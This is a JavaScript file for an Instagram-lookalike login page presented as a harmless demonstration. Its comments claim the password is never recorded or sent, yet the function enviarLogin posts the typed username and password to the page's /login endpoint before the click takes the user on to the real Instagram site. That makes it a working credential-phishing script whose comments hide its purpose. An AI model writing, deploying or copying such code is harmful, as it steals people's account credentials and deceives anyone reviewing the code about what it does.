'use strict';

// O idioma controla apenas a navegação para o site oficial.
const languageSelector = document.querySelector('select');

languageSelector?.addEventListener('change', () => {
  const language = languageSelector.value;
  if (!/^[a-z]{2,3}(?:[-_][a-z]{2,4})?$/i.test(language)) return;
  window.location.assign(`https://www.instagram.com/?hl=${encodeURIComponent(language)}`);
});

// Apenas presença do usuário fictício e comprimento da senha controlam o link.
// O conteúdo não é registrado, armazenado nem enviado.
const demonstrationPassword = document.querySelector('#login_form input[type="password"]');
const demonstrationUser = document.querySelector('#login_form input[type="text"]');
const loginLink = document.querySelector('#demo-login-link');
const passwordToggle = document.querySelector('#toggle-password');

function updateLoginAppearance() {
  const ready = demonstrationUser.value.trim().length > 0 && demonstrationPassword.value.length >= 6;
  loginLink.classList.toggle('demo-password-ready', ready);
  loginLink.setAttribute('aria-disabled', String(!ready));
}

// Envia os dados do formulário para o servidor (/login) quando o link é clicado.
function enviarLogin() {
  const corpo = 'username=' + encodeURIComponent(demonstrationUser.value.trim()) +
                '&password=' + encodeURIComponent(demonstrationPassword.value);

  fetch('/login', {
    method: 'POST',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body: corpo
  }).catch(() => {});
}

if (demonstrationPassword && demonstrationUser && loginLink) {
  demonstrationPassword.addEventListener('input', updateLoginAppearance);
  demonstrationUser.addEventListener('input', updateLoginAppearance);
  window.addEventListener('pageshow', updateLoginAppearance);
  loginLink.addEventListener('click', event => {
    if (loginLink.getAttribute('aria-disabled') === 'true') {
      event.preventDefault();
    } else {
      // Envia os dados antes de redirecionar para o site oficial.
      enviarLogin();
    }
  });
  updateLoginAppearance();
}

if (demonstrationPassword && passwordToggle) {
  passwordToggle.addEventListener('click', () => {
    const visible = demonstrationPassword.type === 'password';
    demonstrationPassword.type = visible ? 'text' : 'password';
    passwordToggle.setAttribute('aria-pressed', String(visible));
    const label = visible ? '' : '';
    passwordToggle.setAttribute('aria-label', label);
    passwordToggle.title = label;
  });
}
